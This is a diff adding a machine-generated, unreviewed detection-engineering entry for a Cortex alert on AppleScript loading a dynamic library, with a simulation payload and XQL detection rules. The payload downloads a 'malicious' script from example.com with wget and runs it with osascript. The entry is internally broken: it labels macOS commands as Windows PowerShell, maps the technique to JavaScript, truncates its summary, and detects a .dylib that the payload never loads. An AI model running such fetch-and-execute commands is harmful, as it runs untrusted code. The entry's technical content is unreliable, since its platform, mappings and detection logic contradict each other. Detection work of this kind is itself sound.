@@ -1,0 +1,187 @@
+{
+  "id": "TTP-0000-0069",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "AppleScript Interpreter Dynamic Library Loaded into Process",
+    "summary": "An attacker executes a malicious AppleScript via osascript, which loads a dynamic library into a process. Cortex detects this behavior as a potential indicator of malicious activity. The attack involv",
+    "description": "An attacker executes a malicious AppleScript via osascript, which loads a dynamic library into a process. Cortex detects this behavior as a potential indicator of malicious activity. The attack involves loading a dynamic library via osascript to execute malicious code."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.007",
+        "name": "Command and Scripting Interpreter: JavaScript",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1106",
+        "name": "Native API",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1553",
+        "subtechnique_id": "T1553.004",
+        "name": "T1553.004",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir -p /tmp/scratch\nwget -O /tmp/scratch/malicious.applescript https://example.com/malicious.scpt\nosascript /tmp/scratch/malicious.applescript\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "osascript process execution",
+        "expected_value": "action_process_image_name = 'osascript'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "AppleScript file loaded",
+        "expected_value": "action_file_path = '/tmp/scratch/malicious.applescript'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "AppleScript Interpreter Dynamic Library Loaded",
+        "description": "Detection of dynamic library loading into osascript process",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'osascript'\n| filter action_process_image_name = 'osascript'\n| filter action_file_path contains '.dylib'",
+        "mitre_technique_ids": [
+          "T1059.007",
+          "T1106",
+          "T1553.004"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "AppleScript Dynamic Library Loading Behavior",
+        "description": "Detects when osascript loads a dynamic library, indicating potential code injection or malicious AppleScript execution",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'osascript'\n| filter action_file_path contains '.dylib'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "osascript process start with dynamic library load",
+        "mitre_technique_ids": [
+          "T1059.007",
+          "T1106",
+          "T1553.004"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect AppleScript Dynamic Library Load",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'osascript'\n| filter action_file_path contains '.dylib'\n| comp count() by actor_process_image_name, action_file_path",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — AppleScript interpreter dynamic library loaded into a process; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/applescript-interpreter-dynamic-library-loaded-into-a-process"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: AppleScript interpreter dynamic library loaded into a process",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/applescript-interpreter-dynamic-library-loaded-into-a-process",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.007",
+      "url": "https://attack.mitre.org/techniques/T1059/007/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1106",
+      "url": "https://attack.mitre.org/techniques/T1106/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1553.004",
+      "url": "https://attack.mitre.org/techniques/T1553/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
